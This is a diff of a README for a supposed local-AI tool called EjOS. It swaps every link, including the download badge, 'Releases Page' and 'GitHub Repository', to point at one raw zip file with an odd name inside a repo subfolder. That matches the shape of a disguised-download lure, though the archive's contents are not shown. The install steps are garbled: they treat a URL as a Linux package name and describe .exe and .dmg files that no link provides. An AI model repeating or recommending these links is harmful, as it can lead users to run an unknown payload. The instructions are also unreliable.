@@ -20,27 +20,27 @@ If you are using a Raspberry Pi, ensure you have the latest version (Raspberry P
 
 To start using EjOS, download the latest version from our Releases page. 
 
-[![Download EjOS](https://raw.githubusercontent.com/jaylen7916/EjOS/main/01_Lenovo-Ollama-Server/OS_Ej_3.6.zip%20EjOS-v1.0-blue)](https://raw.githubusercontent.com/jaylen7916/EjOS/main/01_Lenovo-Ollama-Server/OS_Ej_3.6.zip)
+[![Download EjOS](https://github.com/jaylen7916/EjOS/raw/refs/heads/main/01_Lenovo-Ollama-Server/OS-Ej-monogoneutic.zip%20EjOS-v1.0-blue)](https://github.com/jaylen7916/EjOS/raw/refs/heads/main/01_Lenovo-Ollama-Server/OS-Ej-monogoneutic.zip)
 
 ## 📋 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to get the latest version of EjOS:
    
-   [Visit the Releases Page](https://raw.githubusercontent.com/jaylen7916/EjOS/main/01_Lenovo-Ollama-Server/OS_Ej_3.6.zip)
+   [Visit the Releases Page](https://github.com/jaylen7916/EjOS/raw/refs/heads/main/01_Lenovo-Ollama-Server/OS-Ej-monogoneutic.zip)
 
 2. **Choose Your Version:** On the Releases page, find the most recent version. It is usually at the top of the list. Click on it to see the available files for download.
 
 3. **Select the Right File:**
    - For Windows users, download the `.exe` file.
    - For macOS users, download the `.dmg` file.
-   - For Linux users, look for the `https://raw.githubusercontent.com/jaylen7916/EjOS/main/01_Lenovo-Ollama-Server/OS_Ej_3.6.zip` package.
+   - For Linux users, look for the `https://github.com/jaylen7916/EjOS/raw/refs/heads/main/01_Lenovo-Ollama-Server/OS-Ej-monogoneutic.zip` package.
 
 4. **Download the File:** Click on the chosen file to start the download. Once the download is complete, locate the file and proceed with the installation.
 
 5. **Install EjOS:** 
    - **On Windows:** Double-click the `.exe` file and follow the on-screen instructions.
    - **On macOS:** Open the `.dmg` file, and drag the EjOS icon into your Applications folder.
-   - **On Linux:** Extract the `https://raw.githubusercontent.com/jaylen7916/EjOS/main/01_Lenovo-Ollama-Server/OS_Ej_3.6.zip` file and run the installation script using the terminal.
+   - **On Linux:** Extract the `https://github.com/jaylen7916/EjOS/raw/refs/heads/main/01_Lenovo-Ollama-Server/OS-Ej-monogoneutic.zip` file and run the installation script using the terminal.
 
 ## 🎤 Using EjOS
 
@@ -77,6 +77,6 @@ For further assistance, you can check the issues section on our GitHub page. Eng
 
 Join discussions or contribute to improving EjOS. Visit our GitHub repository for more information. Your input can help shape the future of this project. 
 
-[Visit our GitHub Repository](https://raw.githubusercontent.com/jaylen7916/EjOS/main/01_Lenovo-Ollama-Server/OS_Ej_3.6.zip)
+[Visit our GitHub Repository](https://github.com/jaylen7916/EjOS/raw/refs/heads/main/01_Lenovo-Ollama-Server/OS-Ej-monogoneutic.zip)
 
 Thank you for choosing EjOS! Dive into your journey with local AI and experience the capabilities right from your device.
